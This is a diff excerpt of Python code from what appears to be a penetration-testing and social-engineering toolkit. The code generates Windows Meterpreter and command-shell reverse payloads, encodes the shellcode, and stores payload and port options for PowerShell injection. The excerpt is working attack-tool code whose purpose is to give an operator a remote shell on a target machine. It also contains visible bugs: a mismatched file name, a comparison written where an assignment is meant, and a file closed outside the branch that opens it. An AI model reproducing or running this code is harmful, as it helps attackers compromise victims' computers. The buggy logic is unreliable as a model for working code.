@@ -404,30 +404,33 @@ try:
                         subprocess.Popen("ruby %s/msfencode -e x86/alpha_mixed -i %s/meterpreter.raw -t raw BufferRegister=EAX > %s/meterpreter.alpha_decoded" % (path,setdir,setdir), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
 
                     if choice1 == "shellcode/pyinject" or choice1 == "shellcode/multipyinject":
+                        # here we update set options to specify pyinjection and multipy
+                        update_options("PYINJECTION=ON")
                     # define, this will eventually be all of our payloads
                         multipyinject_payload = ""
                         # clean up old file
                         if os.path.isfile("%s/meta_config_multipyinjector" % (setdir)):
                             os.remove("%s/meta_config_multipyinjector" % (setdir))
+
+                        # remove any old payload options
+                        if os.path.isfile(setdir + "/payload.options.shellcode"): os.remove(setdir + "/payload_options.shellcode")
+                        # this is the file that gets saved with the payload and port options
+                        payload_options = file(setdir + "/payload_options.shellcode", "a")
+                        
                         while 1:
                                                 
                             if choice1 == "shellcode/multipyinject":
                                 print ("\nSelect the payload you want to deliver via shellcode injection\n\n   1) Windows Meterpreter Reverse TCP\n   2) Windows Meterpreter (Reflective Injection), Reverse HTTPS Stager\n   3) Windows Meterpreter (Reflective Injection) Reverse HTTP Stager\n   4) Windows Meterpreter (ALL PORTS) Reverse TCP\n   5) Windows Reverse Command Shell\n   6) I'm finished adding payloads.\n")
                                 choice9 = raw_input(setprompt(["4"], "Enter the number for the payload [meterpreter_reverse_tcp]"))
                                 # select default meterpreter reverse tcp
-                                if choice9 == "" or choice9 == "1":
-                                    choice9 = "windows/meterpreter/reverse_tcp"
+                                if choice9 == "" or choice9 == "1": choice9 = "windows/meterpreter/reverse_tcp"
                                 # select reverse https
-                                if choice9 == "2":
-                                    choice9 = "windows/meterpreter/reverse_https"
+                                if choice9 == "2": choice9 = "windows/meterpreter/reverse_https"
                                 # select reverse http
-                                if choice9 == "3":
-                                    choice9 = "windows/meterpreter/reverse_http"
+                                if choice9 == "3": choice9 = "windows/meterpreter/reverse_http"
                                 # select all ports
-                                if choice9 == "4":
-                                    choice9 = "windows/meterpreter/reverse_tcp_allports"
-                                if choice9 == "5":
-                                    choice9 = "windows/shell/reverse_tcp"
+                                if choice9 == "4": choice9 = "windows/meterpreter/reverse_tcp_allports"
+                                if choice9 == "5": choice9 = "windows/shell/reverse_tcp"
                                 # check the ipaddr
                                 if ipaddr == "":
                                     # grab ipaddr if not defined
@@ -450,18 +453,27 @@ try:
                                         print_status("Possible hostname detected, switching to windows/meterpreter/reverse_https")
                                         choice9 == "windows/meterpreter/reverse_https"
 
-                            if choice9 == "windows/meterpreter/reverse_tcp_allports": portnum = "LPORT=1"
+                            if choice9 == "windows/meterpreter/reverse_tcp_allports": 
+                                portnum = "LPORT=1"
+
+                            # fix port num
+                            portnum = shellcode_port
 
                             # meterpreter reverse_tcp
-                            if choice9 == "windows/meterpreter/reverse_tcp": shellcode = metasploit_shellcode(choice9, choice2, portnum)
+                            if choice9 == "windows/meterpreter/reverse_tcp": 
+                                shellcode = metasploit_shellcode(choice9, choice2, portnum)
                             # meterpreter reverse_https
-                            if choice9 == "windows/meterpreter/reverse_https": shellcode = metasploit_shellcode(choice9, choice2,portnum)
+                            if choice9 == "windows/meterpreter/reverse_https": 
+                                shellcode = metasploit_shellcode(choice9, choice2,portnum)
                             # meterpreter reverse_http
-                            if choice9 == "windows/meterpreter/reverse_http": shellcode = metasploit_shellcode(choice9, choice2,portnum)
+                            if choice9 == "windows/meterpreter/reverse_http": 
+                                shellcode = metasploit_shellcode(choice9, choice2,portnum)
                             # meterpreter tcp allports
-                            if choice9 == "windows/meterpreter/reverse_tcp_allports": shellcode = metasploit_shellcode(choice9, choice2,portnum)
+                            if choice9 == "windows/meterpreter/reverse_tcp_allports": 
+                                shellcode = metasploit_shellcode(choice9, choice2,portnum)
                             # windows shell reverse_tcp
-                            if choice9 == "windows/shell/reverse_tcp": shellcode = metasploit_shellcode(choice9, choice2, portnum)
+                            if choice9 == "windows/shell/reverse_tcp": 
+                                shellcode = metasploit_shellcode(choice9, choice2, portnum)
 
                             if choice1 == "shellcode/pyinject":
                                 shellcode_port = portnum.replace("LPORT=", "")
@@ -469,9 +481,13 @@ try:
                             if validate_ip(choice2) == True:
                                 shellcode = shellcode_replace(choice2, shellcode_port, shellcode)
 
+                            # here we write out the payload and port for later use in powershell injection
+                            payload_options.write(choice9 + " " + portnum + ",")
+
                             # break out of the loop if we are only using one payload else keep on
                             if choice1 == "shellcode/pyinject": break
                             multipyinject_payload += shellcode + ","
+                        
                         
                         # get rid of tail comma
                         if multipyinject_payload.endswith(","):
@@ -487,6 +503,9 @@ try:
                         filewrite = file("%s/meterpreter.alpha_decoded" % (setdir), "w")
                         filewrite.write(shellcode)
                         filewrite.close()
+                    
+                    # close the pyinjector file for ports and payload
+                    payload_options.close()
 
                     # here we are going to encode the payload via base64
                     fileopen = file("%s/meterpreter.alpha_decoded" % (setdir), "r")
